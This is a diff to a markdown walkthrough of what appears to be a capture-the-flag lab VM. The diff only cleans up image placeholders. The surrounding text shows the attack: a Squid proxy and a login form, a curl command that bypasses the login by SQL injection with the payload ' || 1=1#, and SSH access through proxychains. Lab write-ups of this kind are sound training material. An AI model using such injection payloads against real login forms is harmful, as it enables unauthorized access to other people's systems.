@@ -24,8 +24,9 @@ PORT     STATE    SERVICE    VERSION
 MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)
 ```
 Ok then so a Squid, a webserver, and ssh. Checking out the website we see a Skytech Login form.
-Insert 1.png skytech main page 
+
 ![](pics/1.png)
+
 So try admin' in the input box and it  shows us a sql error.
 ```
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
@@ -39,7 +40,7 @@ So we replace the OR with || instead and it works we are now logged in as the us
 ```
 curl --data "email=admin&password=' || 1=1#" http://192.168.56.101/login.php
 ```
-Insert 2.png login panel
+
 ![](pics/2.png)
 
 OK then we have some creds for the ssh that's behind this proxy. So we setup our /etc/proxychains.conf to use the http proxy on port 3128  then we can ssh into the box.
